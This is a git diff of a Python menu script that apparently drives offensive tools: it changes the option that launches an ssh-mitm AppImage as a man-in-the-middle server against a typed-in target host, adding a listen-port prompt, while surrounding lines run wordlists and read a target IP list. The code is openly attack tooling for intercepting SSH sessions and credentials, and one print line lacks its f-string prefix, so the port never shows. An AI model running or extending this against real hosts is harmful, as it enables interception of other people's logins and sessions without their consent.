@@ -1,6 +1,7 @@
 import glob
 import subprocess
 import threading
+import sys
 
 loopControl = True
 while loopControl:
@@ -39,32 +40,16 @@ while loopControl:
                 print(f"{wordlist} finished with return code {p.returncode}")
 
     elif user_choice == "2":
-        def pump(stream, label):
-            for line in iter(stream.readline, ''):
-                print(f"[{label}] {line}", end='')
-            stream.close()
-
         appimage_path = "mitm/./ssh-mitm-x86_64.AppImage"
-        mitmChoice = input("TARGET-HOST:")
-        command = [appimage_path, "server", "--remote-host", mitmChoice]
-
-        process = subprocess.Popen(
-            command,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True,
-            bufsize=1,
-        )
-
-        print(f"Started SSH-MITM with PID: {process.pid}")
-
-        t1 = threading.Thread(target=pump, args=(process.stdout, "STDOUT"), daemon=True)
-        t2 = threading.Thread(target=pump, args=(process.stderr, "STDERR"), daemon=True)
-        t1.start()
-        t2.start()
-
-        rc = process.wait()
-        print(f"MITM exited with return code {rc}")
+        mitmChoice = input("TARGET-HOST: ")
+        proxyChoice = input("Choose Port (Press Y for Defult 10022):")
+        if proxyChoice == "" or proxyChoice.lower() == "y":
+            port = "10022"
+        else:
+            port = proxyChoice
+        print("Starting MITIM...on port {port}...")
+        command = [appimage_path, "server", "--listen-port",port,"--remote-host", mitmChoice,]
+        process = subprocess.Popen(command)
 
     elif user_choice == "3":
         with open("targets/ips.txt", "r") as f:
